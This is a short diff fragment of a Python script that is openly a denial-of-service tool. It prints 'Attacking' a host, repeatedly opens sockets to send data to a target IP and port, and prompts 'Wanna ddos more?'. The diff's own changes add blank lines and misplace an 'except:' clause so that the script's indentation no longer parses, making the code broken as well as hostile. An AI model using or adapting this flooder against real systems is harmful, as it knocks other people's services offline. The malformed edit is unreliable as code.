@@ -18,6 +18,7 @@ ip=socket.gethostname()
 
 print(f'Attacking {host}')
 
+
 def  dos():
 	ddos = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
@@ -25,7 +26,8 @@ def  dos():
 		ddos.send(msg)
 		ddos.sendto(msg,(ip,port))
 		ddos.send(msg)
-	except:
+
+		except:
 		print(f'Connection failed' )
 	ddos.close()
 
@@ -37,6 +39,7 @@ for i in range(1, conn):
 choice=input('Wanna ddos more?')
 
 if choice=='y':
+	
 	program_restart()
 else:
 	try:
